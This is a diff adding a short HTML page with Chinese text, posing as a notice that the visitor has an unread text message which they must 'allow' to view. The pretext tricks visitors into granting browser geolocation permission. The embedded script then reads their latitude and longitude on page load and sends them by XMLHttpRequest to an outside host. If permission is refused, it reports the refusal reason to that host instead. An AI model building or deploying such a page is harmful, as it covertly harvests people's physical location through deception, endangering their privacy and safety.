@@ -1,0 +1,44 @@
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>你的短消息</title>
+    </head>
+    <body>
+        <p id = "id1">您有一条短消息，请点击允许进行查看</p>
+        <script>
+            getLocation();
+
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(pos) {
+                        var wz="经度，纬度： " + pos.coords.latitude + " ," + pos.coords.longitude;
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("GET", "http://www.baidu.com?" + wz)
+                        xhr.send(null);
+                    }, function(error) {
+                        var errorMsg;
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = "用户拒绝位置请求";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = "位置无法获取";
+                                break;
+                            case error.TIMEOUT: 
+                                errorMsg = "获取位置请求超时";
+                                break;
+                            default:
+                                errorMsg = "未知错误";
+                                break;
+                        }
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("GET", "http://www.baidu.com?" + errorMsg)
+                        xhr.send(null);
+                    })
+                } else {
+                    //alert(null);
+                }
+            }
+        </script>
+    </body>
+</html>
